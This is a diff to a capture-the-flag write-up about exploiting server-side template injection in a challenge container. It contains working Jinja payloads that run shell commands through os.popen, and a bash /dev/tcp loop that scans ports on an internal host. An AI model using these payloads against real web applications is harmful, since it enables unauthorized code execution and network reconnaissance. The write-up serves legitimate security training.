@@ -39,11 +39,13 @@ It references a toto8042 service that shouldn't be up but still is.
 ```
 This tells us that all ports are forwarded.
 
-ssti4 and toto8042 are on the same network (https://docs.docker.com/compose/networking/#specify-custom-networks).
+ssti4 and toto8042 are on the same network ([docker-compose networks](https://docs.docker.com/compose/networking/#specify-custom-networks)).
 
 We can confirm that by pinging toto8042:
-```
+```python
 {{request.application.__globals__.__builtins__.__import__('os').popen('ping -c 1 toto8042').read()}}
+```
+```
 PING toto8042 (172.23.0.2): 56 data bytes
 64 bytes from 172.23.0.2: icmp_seq=0 ttl=64 time=0.147 ms
 --- toto8042 ping statistics ---
@@ -57,11 +59,11 @@ round-trip min/avg/max/stddev = 0.147/0.147/0.147/0.000 ms
 
 (see port_discovery.js)
 
-nmap (as well as nc, telnet and more) is not available on ssti4 so we can't use it to discover ports.
+nmap, nc, telnet and others are not available on ssti4 so we can't use them to discover ports.
 
-Fortunately the list of the 1000 most used ports is available [here](https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/).
+The list of the 1000 most used ports is available [here](https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/).
 
-We can test if a port is open with this simple bash command ([source](https://stackoverflow.com/a/35338529/12864941)):
+We can test if a port is open with this bash command ([source](https://stackoverflow.com/a/35338529/12864941)):
 ```bash
 timeout 1 bash -c '</dev/tcp/toto8042/${i}' && echo -n open || echo -n closed
 ```
@@ -82,15 +84,13 @@ this is not the way this time, goodluck !!
 
 Port 4242 is not http.
 
-We used python3 to open a TCP socket.
+We can use python3 to open a TCP socket.
 
-To run python code we can use ```python3 -c "command"```.
-
-The ssti command looks like this:
+Run python code with ssti:
 ```py
 {{request.application.__globals__.__builtins__.__import__("os").popen("python -c \"CMD\"").read()}}
 ```
-Note: quotes get a little tricky, the python command can only single quotes, at least using our implementation.
+Note: quotes get a little tricky, the python command can only use single quotes, at least using our implementation.
 
 To see stderr we add ``` 2>&1 | cat``` at the end of the command (redirects stderr to stdout).
 ```py
